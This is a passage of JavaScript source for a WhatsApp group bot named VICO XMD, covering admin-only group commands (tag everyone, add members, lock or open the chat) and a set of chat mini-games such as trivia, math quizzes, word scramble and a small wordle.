            return empire.sendMessage(m.chat,{text:`${q||'📢 Everyone!'}\n\n${mentions.map(id=>`@${id.split('@')[0]}`).join(' ')}`,mentions,contextInfo:newsletterContext({mentionedJid:mentions})},{quoted:m});
        }

        case 'add':
        case 'addmember': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            if (!isBotAdmins) return reply(mess.only.badmin);
            const nums=(text.match(/\d{7,15}/g)||[]).map(n=>`${n.replace(/^0+/,'')}@s.whatsapp.net`);
            if (!nums.length) return reply(`Usage: ${prefix}add 2348012345678`);
            const result=await empire.groupParticipantsUpdate(m.chat,nums,'add').catch(e=>({error:e}));
            if (result?.error) return reply(`❌ Failed to add member: ${result.error.message||result.error}`);
            return reply(`✅ Add request sent for *${nums.length}* member(s).`);
        }

        case 'close':
        case 'grouplock':
        case 'gclock': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            if (!isBotAdmins) return reply(mess.only.badmin);
            await empire.groupSettingUpdate(m.chat,'announcement');
            return reply('🔒 *GROUP LOCKED*\nOnly admins can send messages.');
        }

        case 'open':
        case 'groupopen':
        case 'gcopen': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            if (!isBotAdmins) return reply(mess.only.badmin);
            await empire.groupSettingUpdate(m.chat,'not_announcement');
            return reply('🔓 *GROUP OPENED*\nAll members can send messages.');
        }

        case 'gcmode':
        case 'groupmode': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            const mode=(args[0]||'').toLowerCase();
            if (!['open','close','closed','lock','locked'].includes(mode)) return reply(`⚙️ Usage: ${prefix}groupmode open | close`);
            if (!isBotAdmins) return reply(mess.only.badmin);
            const closed=['close','closed','lock','locked'].includes(mode);
            await empire.groupSettingUpdate(m.chat,closed?'announcement':'not_announcement');
            return reply(closed?'🔒 *GROUP MODE:* ADMINS ONLY':'🔓 *GROUP MODE:* EVERYONE');
        }

        case 'membercount':
        case 'gcmembers': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`👥 *${groupName}*\n\nMembers: *${participants.length}*\nAdmins: *${groupAdmins.length}*\nRegular members: *${Math.max(0,participants.length-groupAdmins.length)}*`);
        }

        case 'groupstat':
        case 'gcstats': {
            if (!isGroup) return reply(mess.only.group);
            const botAdmin=isBotAdmins?'🟢 Yes':'🔴 No';
            const creator=isCreator?'🟢 Yes':'⚪ No';
            return reply(`📊 *GROUP STATUS*\n\n📛 ${groupName}\n👥 Members: ${participants.length}\n👑 Admins: ${groupAdmins.length}\n🤖 Bot admin: ${botAdmin}\n👤 Owner: ${creator}`);
        }

        case 'groupmenu': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`╭━━〔 ɢʀᴏᴜᴘ ᴍᴇɴᴜ 68 〕━━┈⸎
┃𓂃 │▸ .ᴀᴅᴅ
┃𓂃 │▸ .ᴀᴅᴅᴍᴇᴍʙᴇʀ
┃𓂃 │▸ .ᴀᴅᴍɪɴʟɪsᴛ
┃𓂃 │▸ .ᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴀᴅᴍɪɴs2
┃𓂃 │▸ .ᴄʟᴏsᴇ
┃𓂃 │▸ .ᴄʟᴏsᴇᴛɪᴍᴇ
┃𓂃 │▸ .ᴅᴇᴍᴏᴛᴇ
┃𓂃 │▸ .ᴇᴠᴇʀʏᴏɴᴇ
┃𓂃 │▸ .ɢᴄᴀᴅᴍɪɴs
┃𓂃 │▸ .ɢᴄᴅᴇsᴄʀɪᴘᴛɪᴏɴ
┃𓂃 │▸ .ɢᴄɪɴғᴏ
┃𓂃 │▸ .ɢᴄʟᴏᴄᴋ
┃𓂃 │▸ .ɢᴄᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ɢᴄᴍᴏᴅᴇ
┃𓂃 │▸ .ɢᴄᴏᴘᴇɴ
┃𓂃 │▸ .ɢᴄs
┃𓂃 │▸ .ɢᴄsᴛᴀᴛs
┃𓂃 │▸ .ɢᴄsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴀᴅᴍɪɴs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴄᴏᴜɴᴛ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴅᴇsᴄ
┃𓂃 │▸ .ɢʀᴏᴜᴘɪᴅ
┃𓂃 │▸ .ɢʀᴏᴜᴘɪɴғᴏ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴊɪᴅ
┃𓂃 │▸ .ɢʀᴏᴜᴘʟɪɴᴋ
┃𓂃 │▸ .ɢʀᴏᴜᴘʟɪɴᴋ2
┃𓂃 │▸ .ɢʀᴏᴜᴘʟᴏᴄᴋ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴇɴᴜ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴍᴏᴅᴇ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴏᴘᴇɴ
┃𓂃 │▸ .ɢʀᴏᴜᴘᴏᴡɴᴇʀ
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛ
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛs
┃𓂃 │▸ .ɢʀᴏᴜᴘsᴛᴀᴛᴜs
┃𓂃 │▸ .ɢʀᴏᴜᴘᴛɪᴍᴇ
┃𓂃 │▸ .ʜɪᴅᴇᴛᴀɢ
┃𓂃 │▸ .ᴊᴀɪʟ
┃𓂃 │▸ .ᴋɪᴄᴋ
┃𓂃 │▸ .ᴋɪᴄᴋᴀʟʟ
┃𓂃 │▸ .ᴍᴀᴋᴇᴀᴅᴍɪɴ
┃𓂃 │▸ .ᴍᴇᴍʙᴇʀᴄᴏᴜɴᴛ
┃𓂃 │▸ .ᴍᴇᴍʙᴇʀs
┃𓂃 │▸ .ᴍᴇɴᴛɪᴏɴᴀʟʟ
┃𓂃 │▸ .ᴍᴜᴛᴇ
┃𓂃 │▸ .ɴᴏɴᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴏᴘᴇɴ
┃𓂃 │▸ .ᴏᴘᴇɴᴛɪᴍᴇ
┃𓂃 │▸ .ᴘʀɪsᴏɴ
┃𓂃 │▸ .ᴘʀᴏᴍᴏᴛᴇ
┃𓂃 │▸ .ʀᴇʟᴇᴀsᴇ
┃𓂃 │▸ .ʀᴇᴍᴏᴠᴇ
┃𓂃 │▸ .ʀᴇsᴇᴛɢʀᴏᴜᴘʟɪɴᴋ
┃𓂃 │▸ .ʀᴇsᴇᴛʟɪɴᴋ
┃𓂃 │▸ .ʀᴇᴠᴏᴋᴇʟɪɴᴋ
┃𓂃 │▸ .sᴇᴛᴅᴇsᴄ
┃𓂃 │▸ .sᴇᴛᴅᴇsᴄʀɪᴘᴛɪᴏɴ
┃𓂃 │▸ .sᴇᴛɢᴄɴᴀᴍᴇ
┃𓂃 │▸ .sᴇᴛɴᴀᴍᴇ
┃𓂃 │▸ .sᴇᴛsᴜʙᴊᴇᴄᴛ
┃𓂃 │▸ .sɪʟᴇɴᴛᴛᴀɢ
┃𓂃 │▸ .ᴛᴀɢ
┃𓂃 │▸ .ᴛᴀɢᴀᴅᴍɪɴs
┃𓂃 │▸ .ᴛᴀɢᴀʟʟ
┃𓂃 │▸ .ᴛᴀɢᴀʟʟ2
┃𓂃 │▸ .ᴜɴᴀᴅᴍɪɴ
┃𓂃 │▸ .ᴜɴᴊᴀɪʟ
╰━━━━━━━━━━┈⸎`);
        }

        case 'rps': {
            const choices = ['rock','paper','scissors'];
            const user = q.toLowerCase();
            if (!choices.includes(user)) return reply(`✊ *RPS*\nUse: ${prefix}rps rock\nUse: ${prefix}rps paper\nUse: ${prefix}rps scissors`);
            const bot = choices[randInt(0,2)];
            const win = (user === 'rock' && bot === 'scissors') || (user === 'paper' && bot === 'rock') || (user === 'scissors' && bot === 'paper');
            return reply(`🎮 *RPS*\n\nYou: *${user}*\nVICO: *${bot}*\n\n${user === bot ? '🤝 Draw!' : win ? '🏆 You win!' : '😎 VICO wins!'}`);
        }

        case 'dice': return reply(`🎲 *DICE*\n\nYou rolled: *${randInt(1,6)}*`);
        case 'coin': return reply(`🪙 *COIN FLIP*\n\nResult: *${Math.random() < .5 ? 'HEADS' : 'TAILS'}*`);
        case 'eightball': {
            const answers = ['Yes ✨','No ❌','Maybe 🤔','Definitely 🔥','Ask again later ⏳','It is looking good 😎','Not today 🥶','Absolutely 💯'];
            return q ? reply(`🎱 *8-BALL*\n\nQuestion: ${q}\nAnswer: *${answers[randInt(0,answers.length-1)]}*`) : reply(`Ask a question: ${prefix}eightball Will I win?`);
        }

        case 'guess': {
            const id = gameUserId(m);
            let state = miniGameState.get(id);
            if (!state || state.type !== 'guess') {
                state = { type:'guess', number:randInt(1,20), tries:0 };
                miniGameState.set(id, state);
                return reply(`🎯 *GUESS THE NUMBER*\n\nI'm thinking of a number from *1–20*.\nReply with ${prefix}guess <number>`);
            }
            const n = Number(q);
            if (!Number.isInteger(n) || n < 1 || n > 20) return reply('❌ Enter a whole number from 1 to 20.');
            state.tries++;
            if (n === state.number) {
                miniGameState.delete(id);
                return reply(`🎉 *CORRECT!* You got it in ${state.tries} tries.`);
            }
            return reply(`${n < state.number ? '⬆️ Higher' : '⬇️ Lower'} — try again!`);
        }

        case 'trivia': {
    const triviaQs = [
        ['What is the largest planet in our solar system?',['Earth','Jupiter','Mars','Venus'],1],
        ['How many continents are there?',['5','6','7','8'],2],
        ['What gas do plants absorb?',['Oxygen','Nitrogen','Carbon dioxide','Hydrogen'],2],
        ['Which ocean is the largest?',['Atlantic','Indian','Pacific','Arctic'],2],
        ['Who painted Mona Lisa?',['Van Gogh','Da Vinci','Picasso','Monet'],1],
        ['What is H2O?',['Oxygen','Water','Hydrogen','Salt'],1],
        ['How many legs does a spider have?',['6','8','10','4'],1],
        ['What is the capital of Japan?',['Seoul','Beijing','Tokyo','Bangkok'],2],
        ['Which element has symbol Au?',['Silver','Gold','Aluminum','Argon'],1],
        ['How many sides does a hexagon have?',['5','6','7','8'],1],
        ['What is the fastest land animal?',['Lion','Cheetah','Tiger','Leopard'],1],
        ['Who discovered gravity?',['Newton','Einstein','Galileo','Tesla'],0],
        ['What is 7 x 8?',['54','56','64','48'],1],
        ['Which planet is known as Red Planet?',['Jupiter','Mars','Saturn','Venus'],1],
        ['What is the largest mammal?',['Elephant','Blue Whale','Giraffe','Shark'],1],
        ['How many colors in rainbow?',['6','7','8','5'],1],
        ['What is capital of Nigeria?',['Lagos','Abuja','Kano','Ibadan'],1],
        ['Which language is used for WhatsApp bots?',['Python','JavaScript','C++','Java'],1],
        ['What is the smallest prime number?',['0','1','2','3'],2],
        ['Who is CEO of Meta?',['Elon Musk','Mark Zuckerberg','Sundar','Tim Cook'],1],
        ['What does CPU stand for?',['Central Processing Unit','Computer Power Unit','Central Program Unit','Control Processing Unit'],0],
        ['Which country has Eiffel Tower?',['Italy','France','Spain','Germany'],1],
        ['What is 100 / 4?',['20','25','30','40'],1],
        ['How many hours in a day?',['12','24','48','36'],1],
        ['What is the largest organ in human body?',['Heart','Brain','Skin','Liver'],2],
        ['Which animal can fly?',['Elephant','Bat','Cat','Dog'],1],
        ['What is the chemical symbol for Iron?',['Ir','Fe','I','In'],1],
        ['Who wrote Romeo and Juliet?',['Shakespeare','Dickens','Austen','Twain'],0],
        ['What is 9 squared?',['18','81','72','99'],1],
        ['Which is a programming language?',['Photoshop','Python','Excel','Chrome'],1],
        ['What is capital of Ghana?',['Accra','Kumasi','Lagos','Abidjan'],0],
        ['How many players in football team?',['9','10','11','12'],2],
        ['What is the currency of Japan?',['Yuan','Yen','Won','Ringo'],1],
        ['Which planet has rings?',['Earth','Mars','Saturn','Mercury'],2],
        ['What is 15 + 25?',['35','40','45','30'],1],
        ['Who invented light bulb?',['Tesla','Edison','Newton','Einstein'],1],
        ['What color is chlorophyll?',['Red','Blue','Green','Yellow'],2],
        ['How many teeth adult human have?',['28','32','30','36'],1],
        ['What is largest desert?',['Sahara','Antarctica','Gobi','Arctic'],1],
        ['Which is not a fruit?',['Apple','Carrot','Mango','Banana'],1],
        ['What is 50% of 200?',['50','100','150','200'],1],
        ['Which continent is Egypt in?',['Asia','Africa','Europe','South America'],1],
        ['What is speed of light?',['Fast','300,000 km/s','1,000 km/s','Infinite'],1],
        ['How many bones in human body?',['206','300','150','100'],0],
        ['What is capital of USA?',['New York','Washington DC','LA','Chicago'],1],
        ['Which gas we breathe out?',['Oxygen','Carbon dioxide','Nitrogen','Helium'],1],
        ['What is 12 x 12?',['124','144','132','122'],1],
        ['Who is known as Father of Computer?',['Charles Babbage','Bill Gates','Steve Jobs','Alan Turing'],0],
        ['What is boiling point of water?',['50°C','100°C','0°C','150°C'],1],
        ['Which animal is tallest?',['Elephant','Giraffe','Whale','Camel'],1],
        ['What is 3! (factorial)?',['3','6','9','12'],1],
        ['Which company made iPhone?',['Samsung','Apple','Nokia','Xiaomi'],1],
        ['What is 2 to power 5?',['10','16','32','64'],2],
        ['How many letters in alphabet?',['24','26','28','30'],1]
    ];

    const userId = gameUserId(m);
    const state = miniGameState.get(userId);

    // If already playing trivia, check answer
    if (state && state.type === 'trivia') {
        let ans = parseInt((q || text || '').trim());
        if (!isNaN(ans) && ans >= 1 && ans <= 4) {
            ans = ans - 1; // to 0-index
            if (ans === state.answer) {
                miniGameState.delete(userId);
                return reply(`✅ *CORRECT!* 🎉\n\nAnswer: *${state.opts[ans]}*\n\nType ${prefix}trivia to play again`);
            } else {
                miniGameState.delete(userId);
                return reply(`❌ *WRONG!*\n\nCorrect was: *${state.opts[state.answer]}* (${state.answer+1})\n\nType ${prefix}trivia for new question`);
            }
        } else {
            return reply(`🧠 You have active trivia:\n${state.question}\n\n1️⃣ ${state.opts[0]}\n2️⃣ ${state.opts[1]}\n3️⃣ ${state.opts[2]}\n4️⃣ ${state.opts[3]}\n\nReply: ${prefix}trivia 1-4`);
        }
    }

    const [question, opts, answer] = triviaQs[randInt(0, triviaQs.length - 1)];
    miniGameState.set(userId, { type: 'trivia', question, opts, answer });
    return reply(`🧠 *TRIVIA*\n\n${question}\n\n1️⃣ ${opts[0]}\n2️⃣ ${opts[1]}\n3️⃣ ${opts[2]}\n4️⃣ ${opts[3]}\n\nReply: ${prefix}trivia 1-4`);
}

case 'mathgame':
case 'math': {
    const userId = gameUserId(m);
    let args = (q || text || '').trim();
    const state = miniGameState.get(userId);

    function genSimpleQuestion() {
        const rand = Math.random();
        let a, b, op;
        op = ['+', '-', 'x'][randInt(0, 2)];

        if (rand < 0.7) {
            // 70% : 2-digit + 1-digit (most common)
            a = randInt(10, 99);
            b = randInt(1, 9);
            if (op === 'x' && a > 20) a = randInt(10, 20); // keep x easy
        } else if (rand < 0.9) {
            // 20% : 2-digit + 2-digit
            a = randInt(10, 99);
            b = randInt(10, 99);
            if (op === 'x') {
                a = randInt(10, 30);
                b = randInt(2, 12);
            }
        } else {
            // 10% : 3-digit rarely
            a = randInt(100, 999);
            b = randInt(10, 99);
            if (op === 'x') {
                a = randInt(100, 200);
                b = randInt(2, 9);
            }
        }

        if (op === '-' && a < b) [a, b] = [b, a];

        const answer = op === '+' ? a + b : op === '-' ? a - b : a * b;
        return { qStr: `${a} ${op} ${b}`, answer };
    }

    // Check answer if already in game
    if (state && state.type === 'mathgame') {
        if (args !== '' && !isNaN(args)) {
            const userAns = Number(args);
            if (userAns === state.answer) {
                miniGameState.delete(userId);
                return reply(
                    `Correct 💯✅\n` +
                    `${state.q} = ${state.answer}\n\n` +
                    `Type ${prefix}mathgame for next question`
                );
            } else {
                miniGameState.delete(userId);
                return reply(
                    `❌ WRONG!\n` +
                    `${state.q} = ${state.answer}\n` +
                    `You: ${userAns}\n\n` +
                    `Type ${prefix}mathgame for new one`
                );
            }
        } else {
            // they typed mathgame again without answering, resend current
            return reply(`Answer this question\n    ${state.q}`);
        }
    }

    // No active game -> new question
    const next = genSimpleQuestion();
    miniGameState.set(userId, { 
        type: 'mathgame', 
        answer: next.answer, 
        q: next.qStr, 
        lastActive: Date.now() 
    });

    return reply(`Answer this question\n    ${next.qStr}`);
}

case 'scramble': {
    const words = ['javascript','whatsapp','computer','galaxy','football','rainbow','developer','interactive','universe','keyboard','mountain','chocolate','airplane','elephant','building'];
    const userId = gameUserId(m);
    const state = miniGameState.get(userId);

    if (state && state.type === 'scramble') {
        const userWord = (q || text || '').trim().toLowerCase();
        if (userWord) {
            if (userWord === state.answer) {
                miniGameState.delete(userId);
                return reply(`✅ *CORRECT!* 🎉 Word was *${state.answer}*\n\nType ${prefix}scramble for new word`);
            } else {
                return reply(`❌ *WRONG!* Try again\nUnscramble: *${state.scrambled}*\nReply: ${prefix}scramble <word>`);
            }
        } else {
            return reply(`🔤 Active: Unscramble *${state.scrambled}*\nReply: ${prefix}scramble <word>`);
        }
    }

    const word = words[randInt(0, words.length - 1)];
    const scrambled = word.split('').sort(() => Math.random() -.5).join('');
    miniGameState.set(userId, { type: 'scramble', answer: word, scrambled });
    return reply(`🔤 *WORD SCRAMBLE*\n\nUnscramble: *${scrambled}*\n\nReply: ${prefix}scramble <word>\nExample: ${prefix}scramble ${word}`);
}

case 'wordle': {
    const words = ['apple','grape','house','light','world','ocean','music','robot','table','chair','plant','water','earth','heart','smile','phone','cloud','dream','night','magic'];
    const userId = gameUserId(m);
    const state = miniGameState.get(userId);

    if (state && state.type === 'wordle') {
        const guess = (q || text || '').trim().toLowerCase();
        if (!guess) return reply(`🟩 Active WORDLE - 5 letters\nTries: ${state.tries}/6\nReply: ${prefix}wordle <word>`);
        if (guess.length!== 5) return reply(`❌ Must be 5 letters! You typed ${guess.length}\nTry: ${prefix}wordle <5-letter-word>`);

        state.tries++;

        if (guess === state.answer) {
            miniGameState.delete(userId);
            return reply(`✅ *YOU WIN!* 🎉\nWord was *${state.answer}* in ${state.tries} tries!\n\nType ${prefix}wordle for new game`);
        }

        if (state.tries >= 6) {
            miniGameState.delete(userId);
            return reply(`❌ *GAME OVER!* Word was *${state.answer}*\n\nType ${prefix}wordle to try again`);
        }

        // Give hint: 🟩 correct pos, 🟨 wrong pos, ⬛ not in word
        let hint = '';
        for (let i = 0; i < 5; i++) {
            if (guess[i] === state.answer[i]) hint += '🟩';
            else if (state.answer.includes(guess[i])) hint += '🟨';
            else hint += '⬛';
        }

        return reply(`🟩 *WORDLE* ${state.tries}/6\n\nYour guess: *${guess}*\nHint: ${hint}\n🟩=correct pos, 🟨=wrong pos, ⬛=not in word\n\nReply: ${prefix}wordle <word>`);
    }

    const word = words[randInt(0, words.length - 1)];
    miniGameState.set(userId, { type: 'wordle', answer: word, tries: 0 });
    return reply(`🟩 *MINI WORDLE*\n\nGuess a 5-letter word. You have 6 tries!\nReply: ${prefix}wordle <word>\nExample: ${prefix}wordle house`);
}
           
        case 'snake':
        case 'snakegame':
        case 'snk':
            return await executeRichGame(empire, m, m.chat, 'snake');

        case 'blackjack':
            return await executeRichGame(empire, m, m.chat, 'blackjack');
            
            case 'word':
            return await executeRichGame(empire, m, m.chat, 'word');
            
            case 'space':
            return await executeRichGame(empire, m, m.chat, 'space'); 
            
            case 'fightgame':
            return await executeRichGame(empire, m, m.chat, 'fight');
            
            case 'pacman':
            return await executeRichGame(empire, m, m.chat, 'pacman');
           
           case 'tictactoe':
            return await executeRichGame(empire, m, m.chat, 'tictactoe');
           
           case 'tetris':
            return await executeRichGame(empire, m, m.chat, 'tetris');
           
            case 'slide':
            return await executeRichGame(empire, m, m.chat, 'slide');
              
            case 'memory':
            return await executeRichGame(empire, m, m.chat, 'memory');
            
            case 'cargame':
            return await executeRichGame(empire, m, m.chat, 'car');
            
            case 'hang':
            return await executeRichGame(empire, m, m.chat, 'hang');
            
            case 'whackgame':
            return await executeRichGame(empire, m, m.chat, 'whack');

        case 'roulette':
            return await executeRichGame(empire, m, m.chat, 'roulette');
        case 'wyr': return reply(`🤔 *WOULD YOU RATHER?*\n\n${['Be able to fly 🪽 or become invisible 👻?','Have unlimited money 💰 or unlimited time ⏳?','Travel to the future 🚀 or past 🕰️?'][randInt(0,2)]}`);
        case 'never': return reply(`🙈 *NEVER HAVE I EVER*\n\n${['...sent a message to the wrong person?','...laughed at the worst possible time?','...stayed awake all night?'][randInt(0,2)]}`);
        case 'ship': {
            const names=q.split(/\s+/).filter(Boolean);
            if (names.length<2) return reply(`Use: ${prefix}ship Alice Bob`);
            return reply(`💞 *SHIP METER*\n\n${names[0]} ❤️ ${names[1]}\n\nCompatibility: *${randInt(1,100)}%*`);
        }
        case 'rate': {
            if (!q) return reply(`Use: ${prefix}rate something`);
            return reply(`⭐ *RATE*\n\n${q}: *${randInt(1,10)}/10*`);
        }
        case 'complimentme': return reply(`✨ *COMPLIMENT*\n\nYou have main-character energy today. Keep building, keep learning, keep it up, keep winning. 🫶`);
        case 'typegame': {
            const phrases=['VICO XMD IS FAST','JAVASCRIPT POWER','GROUP CHAT LEGEND','I AM HIM','BUILD SOMETHING GREAT'];
            const phrase=phrases[randInt(0,phrases.length-1)];
            miniGameState.set(gameUserId(m), {type:'typegame', answer:phrase});
            return reply(`⌨️ *TYPE CHALLENGE*\n\nType this exactly:\n\n*${phrase}*\n\n${prefix}typegame <text>`);
        }
        case 'speedgame': return reply(`⚡ *SPEED GAME*\n\nYour random speed score: *${randInt(50,100)} WPM*\n\nChallenge a friend and beat it!`);
        case 'memorygame': {
            const seq=Array.from({length:5},()=>['🍎','🍋','🍇','⭐','🔥'][randInt(0,4)]).join('');
            miniGameState.set(gameUserId(m), {type:'memorygame', answer:seq});
            return reply(`🧠 *MEMORY GAME*\n\nRemember this:\n\n${seq}\n\nNow send ${prefix}memorytext <sequence>`);
        }
        case 'higherlower':
            return await executeRichGame(empire, m, m.chat, 'higherlower');

        case 'slots':
            return await executeRichGame(empire, m, m.chat, 'slots');
        case 'minegame':
            return await executeRichGame(empire, m, m.chat, 'mines');
        case 'plinkogame':
            return await executeRichGame(empire, m, m.chat, 'plinko');
        case 'crashgame':
            return await executeRichGame(empire, m, m.chat, 'crash');
        case 'dicegame':
            return await executeRichGame(empire, m, m.chat, 'dice');
        case 'coinflip':
            return await executeRichGame(empire, m, m.chat, 'coinflip');
        case 'wheel':
            return await executeRichGame(empire, m, m.chat, 'wheel');
        case 'games':
            return reply(`╭━━〔 ɢᴀᴍᴇs 107 〕━━┈⸎
┃𓂃 │▸ .ᴀᴅᴠɪᴄᴇ
┃𓂃 │▸ .ᴀᴠᴇʀᴀɢᴇ
┃𓂃 │▸ .ʙᴀʟ
┃𓂃 │▸ .ʙᴀʟᴀɴᴄᴇ
┃𓂃 │▸ .ʙɪʙʟᴇǫᴜᴏᴛᴇ
┃𓂃 │▸ .ʙɪɴᴀʀʏ
┃𓂃 │▸ .ʙʟᴀᴄᴋᴊᴀᴄᴋ
┃𓂃 │▸ .ʙᴏᴍʙ
┃𓂃 │▸ .ʙᴏᴍʙɢᴀᴍᴇ
┃𓂃 │▸ .ᴄᴀʟᴄ
┃𓂃 │▸ .ᴄᴀʀɢᴀᴍᴇ
┃𓂃 │▸ .ᴄʜᴀʀs
┃𓂃 │▸ .ᴄᴏɪɴ
┃𓂃 │▸ .ᴄᴏɪɴғʟɪᴘ
┃𓂃 │▸ .ᴄᴏᴍᴘʟɪᴍᴇɴᴛ
┃𓂃 │▸ .ᴄᴏᴜɴᴛ
┃𓂃 │▸ .ᴄᴘᴜ
┃𓂃 │▸ .ᴄʀᴀsʜɢᴀᴍᴇ
┃𓂃 │▸ .ᴅᴀʀᴇ
┃𓂃 │▸ .ᴅᴀᴛᴇ
┃𓂃 │▸ .ᴅᴀʏ
┃𓂃 │▸ .ᴅɪᴄᴇ
┃𓂃 │▸ .ᴅɪᴄᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴅɪᴠɪᴅᴇ
┃𓂃 │▸ .ᴇᴄʜᴏ
┃𓂃 │▸ .ғᴀᴄᴛ
┃𓂃 │▸ .ғɪɢʜᴛɢᴀᴍᴇ
┃𓂃 │▸ .ғʟɪᴘᴛᴇxᴛ
┃𓂃 │▸ .ғʟɪʀᴛ
┃𓂃 │▸ .ɢᴀʟᴀxʏ
┃𓂃 │▸ .ɢᴀᴍᴇs
┃𓂃 │▸ .ɢᴀʏ
┃𓂃 │▸ .ɢɪsᴛ
┃𓂃 │▸ .ɢʀᴇᴇᴛ
┃𓂃 │▸ .ɢᴜᴇss
┃𓂃 │▸ .ʜᴀɴɢ
┃𓂃 │▸ .ʜɪɢʜᴇʀʟᴏᴡᴇʀ
┃𓂃 │▸ .ɪɴsᴜʟᴛ
┃𓂃 │▸ .ᴊᴏᴋᴇ
┃𓂃 │▸ .ʟᴇɴɢᴛʜ
┃𓂃 │▸ .ʟᴏᴡᴇʀᴄᴀsᴇ
┃𓂃 │▸ .ᴍᴀᴛʜғᴀᴄᴛ
┃𓂃 │▸ .ᴍᴀᴛʜɢᴀᴍᴇ
┃𓂃 │▸ .ᴍᴇᴍᴏʀʏ
┃𓂃 │▸ .ᴍᴇᴍᴏʀʏɢᴀᴍᴇ
┃𓂃 │▸ .ᴍɪɴᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴍᴜʟᴛɪᴘʟʏ
┃𓂃 │▸ .ɴᴇᴠᴇʀ
┃𓂃 │▸ .ɴᴇᴡsɴᴀɪᴊᴀ
┃𓂃 │▸ .ɴᴏᴅᴇ
┃𓂃 │▸ .ᴘ
┃𓂃 │▸ .ᴘᴀᴄᴍᴀɴ
┃𓂃 │▸ .ᴘᴀssᴡᴏʀᴅ
┃𓂃 │▸ .ᴘᴇʀᴄᴇɴᴛ
┃𓂃 │▸ .ᴘɪɴɢ
┃𓂃 │▸ .ᴘʟᴀɴᴇᴛ
┃𓂃 │▸ .ᴘʟᴀᴛғᴏʀᴍ
┃𓂃 │▸ .ᴘʟɪɴᴋᴏɢᴀᴍᴇ
┃𓂃 │▸ .ᴘᴏᴡᴇʀ
┃𓂃 │▸ .ᴘʀᴀɴᴋ
┃𓂃 │▸ .ᴘʀᴏᴠᴇʀʙ
┃𓂃 │▸ .ǫʀ
┃𓂃 │▸ .ǫᴜɪᴢ
┃𓂃 │▸ .ǫᴜᴏᴛᴇ
┃𓂃 │▸ .ǫᴜʀᴀɴǫᴜᴏᴛᴇ
┃𓂃 │▸ .ʀᴀᴛᴇ
┃𓂃 │▸ .ʀᴇᴄɪᴘᴇ
┃𓂃 │▸ .ʀᴇʟᴀᴛɪᴏɴsʜɪᴘ
┃𓂃 │▸ .ʀᴇᴘᴇᴀᴛ
┃𓂃 │▸ .ʀɪᴅᴅʟᴇ
┃𓂃 │▸ .ʀᴏᴀsᴛ
┃𓂃 │▸ .ʀᴏᴜʟᴇᴛᴛᴇ
┃𓂃 │▸ .ʀᴘs
┃𓂃 │▸ .sᴄɪᴇɴᴄᴇғᴀᴄᴛ
┃𓂃 │▸ .sᴄʀᴀᴍʙʟᴇ
┃𓂃 │▸ .sᴇɴsɪ
┃𓂃 │▸ .sᴇʀᴠᴇʀ
┃𓂃 │▸ .sʜɪᴘ
┃𓂃 │▸ .sʜᴏʀᴛ
┃𓂃 │▸ .sʜᴏʀᴛᴜʀʟ
┃𓂃 │▸ .sʟɪᴅᴇ
┃𓂃 │▸ .sʟᴏᴛs
┃𓂃 │▸ .sɴᴀᴋᴇ
┃𓂃 │▸ .sɴᴀᴋᴇɢᴀᴍᴇ
┃𓂃 │▸ .sᴘᴀᴄᴇ
┃𓂃 │▸ .sᴘᴇᴇᴅɢᴀᴍᴇ
┃𓂃 │▸ .sᴛᴜᴘɪᴅ
┃𓂃 │▸ .sᴜᴍ
┃𓂃 │▸ .ᴛᴇᴛʀɪs
┃𓂃 │▸ .ᴛɪᴄᴛᴀᴄᴛᴏᴇ
┃𓂃 │▸ .ᴛɪᴍᴇ
┃𓂃 │▸ .ᴛɪᴍᴇsᴛᴀᴍᴘ
┃𓂃 │▸ .ᴛɪᴍᴇᴢᴏɴᴇ
┃𓂃 │▸ .ᴛɪɴʏᴛᴇxᴛ
┃𓂃 │▸ .ᴛʀɪᴠɪᴀ
┃𓂃 │▸ .ᴛʀᴜᴛʜ
┃𓂃 │▸ .ᴛʏᴘᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴜᴘᴘᴇʀᴄᴀsᴇ
┃𓂃 │▸ .ᴜᴜɪᴅ
┃𓂃 │▸ .ᴡᴇᴀᴛʜᴇʀ
┃𓂃 │▸ .ᴡʜᴀᴄᴋɢᴀᴍᴇ
┃𓂃 │▸ .ᴡʜᴇᴇʟ
┃𓂃 │▸ .ᴡᴏʀᴅ
┃𓂃 │▸ .ᴡᴏʀᴅʟᴇ
┃𓂃 │▸ .ᴡᴏʀᴅs
┃𓂃 │▸ .ᴡʏʀ
┃𓂃 │▸ .ʏᴀʀɴ
╰━━━━━━━━━━┈⸎`);

        case 'pick': {
            const items=q.split(',').map(x=>x.trim()).filter(Boolean);
            return items.length ? reply(`🎯 *PICKED:* ${items[randInt(0,items.length-1)]}`) : reply(`Use: ${prefix}pick pizza, burger, rice`);
        }
        case 'fact': {
            const facts=['Honey never spoils when stored properly.','Octopuses have three hearts.','Bananas are berries botanically.','A day on Venus is longer than its year.'];
            return reply(`💡 *RANDOM FACT*\n\n${facts[randInt(0,facts.length-1)]}`);
        }
        case 'jokegame': {
            const jokes=['Why do programmers prefer dark mode? Because light attracts bugs. 🐛','I told my computer I needed a break… it said “no problem, I’ll go to sleep.” 😂','Why was JavaScript so calm? It knew how to handle its promises. 😎'];
